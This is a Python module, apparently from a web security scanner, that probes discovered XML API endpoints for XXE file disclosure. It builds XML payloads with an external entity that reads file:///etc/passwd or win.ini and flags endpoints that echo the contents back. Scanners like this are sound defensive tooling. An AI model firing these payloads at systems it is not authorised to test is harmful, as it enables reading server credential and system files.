"""XML External Entity (XXE) file disclosure — issue #104 (in-band only).

The XML body-injection surface already exists (``targets.py``/``run_injection``
deliver ``body_format="xml"`` targets from API discovery), but XXE is not a
value substitution: the payload is a whole-body construction — an XML prolog
plus a ``<!DOCTYPE>`` declaring an external ``SYSTEM`` entity, with ``&xxe;``
referenced inside the body. So this is a bespoke module (shaped like
``open_redirect.py``): it builds the XML itself, POSTs it to each discovered XML
target, and confirms success with the shared file-disclosure signatures.

v1 is **in-band only**: it detects XXE whose resolved file contents are echoed
back in the response. Blind XXE (out-of-band external DTD) is intentionally out
of scope, and no entity-expansion/DoS payloads are ever sent.
"""
from concurrent.futures import ThreadPoolExecutor, as_completed

from sitadel.config.settings import Risk
from sitadel.utils.container import Services
from .. import AttackPlugin
from ._signatures import FILE_DISCLOSURE

# Well-known files to read; each pairs with a signature in FILE_DISCLOSURE.
_SYSTEM_URIS = ("file:///etc/passwd", "file:///c:/windows/win.ini")


class Xxe(AttackPlugin):
    level = Risk.DANGEROUS

    def _xml_targets(self, crawled_urls):
        """Discovered targets that accept an XML body (from API discovery)."""
        return [
            t for t in self.build_targets(crawled_urls)
            if t.body_format == "xml"
        ]

    @staticmethod
    def _build_body(target, system_uri):
        """An XML doc whose external entity is referenced in each field.

        The entity is placed in the target's own element names when known so it
        lands where the parser reads input; otherwise a generic element is used.
        """
        names = list(target.params) or ["xxe"]
        entity = '<!ENTITY xxe SYSTEM "%s">' % system_uri
        inner = "".join("<%s>&xxe;</%s>" % (name, name) for name in names)
        return (
            '<?xml version="1.0"?>\n'
            '<!DOCTYPE root [%s]>\n'
            '<root>%s</root>' % (entity, inner)
        )

    def _check(self, output, request, target):
        method = target.method if target.method != "GET" else "POST"
        for uri in _SYSTEM_URIS:
            body = self._build_body(target, uri)
            resp = request.send(
                url=target.url, method=method, payload=body,
                headers={"Content-Type": "application/xml"},
            )
            if resp is None:
                continue
            if FILE_DISCLOSURE.search(resp.text):
                output.finding(
                    "That site may be vulnerable to XXE (file disclosure) at %s"
                    % target.describe(),
                    url=target.url,
                    plugin="Xxe",
                    parameter=",".join(target.params) or None,
                    evidence="external entity SYSTEM %s reflected file contents"
                             % uri,
                    finding_type="xxe",
                )
                return  # one finding per endpoint is enough

    def _cancelled(self):
        try:
            return Services.get("cancel").is_set()
        except NameError:
            return False

    def process(self, start_url, crawled_urls):
        output = Services.get("output")
        request = Services.get("request_factory")
        logger = Services.get("logger")

        output.info("Checking XML external entity (XXE)...")
        targets = self._xml_targets(crawled_urls)
        if not targets:
            # No XML endpoints discovered (needs an XML API spec); clean no-op.
            return

        def scan(target):
            if self._cancelled():
                return
            try:
                self._check(output, request, target)
            except Exception as e:
                logger.error(e)
                output.debug("XXE error on %s: %s" % (target.url, e))

        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = [executor.submit(scan, t) for t in targets]
            try:
                for future in as_completed(futures):
                    if self._cancelled():
                        executor.shutdown(cancel_futures=True)
                        break
                    future.result()
            except KeyboardInterrupt:
                executor.shutdown(False)
                raise
